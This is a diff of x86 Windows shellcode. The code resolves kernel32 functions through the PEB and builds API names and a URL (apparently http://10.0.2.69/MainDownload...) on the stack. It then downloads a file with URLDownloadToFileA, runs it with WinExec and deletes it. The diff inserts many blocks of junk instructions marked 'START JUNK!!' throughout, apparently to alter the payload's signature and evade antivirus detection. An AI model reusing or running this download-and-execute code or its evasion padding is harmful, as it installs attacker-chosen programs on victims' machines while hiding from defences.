@@ -3,10 +3,23 @@
 
 xor ecx, ecx
 mov eax, [fs:ecx + 0x30]               ; EAX = PEB
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
+mov eax, [fs:ecx + 0x30]               ; EAX = PEB
 mov eax, [eax + 0xc]                   ; EAX = PEB->Ldr
 mov esi, [eax + 0x14]                  ; ESI = PEB->Ldr.InMemOrder
 lodsd                                  ; EAX = Second module
 xchg eax, esi                          ; EAX = ESI, ESI = EAX
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 lodsd                                  ; EAX = Third(kernel32)
 mov ebx, [eax + 0x10]                  ; EBX = Base address
 mov edx, [ebx + 0x3c]                  ; EDX = DOS->e_lfanew
@@ -37,20 +50,46 @@ add esi, ebx                           ; ESI = Address table
 mov edx, [esi + ecx * 4]               ; EDX = Pointer(offset)
 add edx, ebx                           ; EDX = GetProcAddress
 
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
+
 xor ecx, ecx                           ; ECX = 0
 push ebx                               ; Kernel32 base address
 push edx                               ; GetProcAddress
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 push ecx                               ; 0
 push 0x41797261                        ; aryA
 push 0x7262694c                        ; Libr
 push 0x64616f4c                        ; Load
 push esp                               ; LoadLibrary
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 push ebx                               ; Kernel32 base address
 call edx                               ; GetProcAddress(LL)
 
 add esp, 0xc                           ; pop LoadLibrary
 pop ecx                                ; ECX = 0
 push eax                               ; EAX = LoadLibrary
+
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 
 xor eax, eax
 mov ax, 0x6c6c
@@ -71,6 +110,12 @@ push 0x6c6e776f
 push 0x444c5255
 push esp                               ; String on the stack
 push dword [esp + 24]
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 call [esp + 36]
 add esp, 20
 push eax                               ; Function address on the stack
@@ -82,6 +127,12 @@ sub dword [esp + 3], 0x23
 push 0x456e6957
 push esp                               ; String on the stack
 push dword [esp + 28]
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 call [esp + 28]
 add esp, 8
 push eax                               ; Function address on the stack
@@ -91,6 +142,12 @@ mov eax, 0x2341656c
 push eax
 sub dword [esp + 3], 0x23
 push 0x69466574
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 push 0x656c6544
 push esp                               ; String on the stack
 push dword [esp + 36]
@@ -104,10 +161,22 @@ push eax
 sub dword [esp + 3], 0x23
 push 0x616f6c6e
 push 0x776f446e
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 push 0x69614d2f
 push 0x39362e32
 push 0x2e302e30
 push 0x312f2f3a
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 push 0x70747468
 push esp
 
@@ -129,6 +198,12 @@ xor eax, eax
 push eax
 push dword [ESP + 8]
 push dword [ESP + 48]
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 xor eax, eax
 push eax
 call [ESP + 100]
@@ -140,6 +215,12 @@ push 0x6564616f
 push 0x6c6e776f
 push 0x643a6578
 push 0x652e7265
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 push 0x64616f6c
 push 0x6e776f44
 push 0x6e69614d
@@ -156,6 +237,12 @@ push eax
 push 0x6564616f
 push 0x6c6e776f
 push 0x643a6578
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 push 0x652e7265
 push 0x64616f6c
 push 0x6e776f44
@@ -176,4 +263,10 @@ push esp
 
 push dword [ESP + 0]
 call [ESP + 28]
+mov ah, 0x6c                           ; START JUNK!!
+mov al, 0x6c
+xor al, ah
+neg al
+neg ah
+xor al, ah                             ; END JUNK!
 add ESP, 24
